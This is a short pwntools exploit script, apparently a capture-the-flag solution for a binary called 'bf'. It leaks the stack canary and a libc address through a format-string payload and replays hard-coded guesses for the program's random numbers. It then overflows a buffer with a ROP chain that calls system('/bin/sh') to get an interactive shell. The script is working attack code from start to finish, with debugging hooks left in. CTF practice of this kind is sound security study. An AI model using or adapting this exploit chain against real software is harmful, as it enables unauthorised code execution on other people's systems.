from pwn import *
context.binary = './bf'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
#	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./bf')

def dbg():
	raw_input()

def guess(rand):
	p.recvuntil('guess:')
	p.sendline(str(rand))
	p.recvline()

rand = [7427, 39356, 9595, 54062, 67371, 42578, 92585, 76990, 22615, 53318]
payload = '%17$p:%19$p+'.ljust(0x1c, 'a') + p32(1)
p.recvline()
p.sendline('1')
p.recvline()
p.sendline(payload)

for i in range(0, 9):
	guess(rand[i])

gdb.attach(p, 'b printf')
dbg()
guess(rand[9])

cookie = int(p.recvuntil(':').strip(':'), 16)
libc_main_ret = int(p.recvuntil('+').strip('+'), 16)

libc_base = libc_main_ret - 240 - libc.symbols['__libc_start_main']

pop_rdi = 0x21102+libc_base
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

print "libc_base ==> " + hex(libc_base)
print "system_addr ==> "+hex(system_addr)

payload = 'a'*0x34 + p64(cookie) + p64(pop_rdi)*2 + p64(binsh) +  p64(system_addr)

p.sendline(payload)
p.interactive()
p.close()



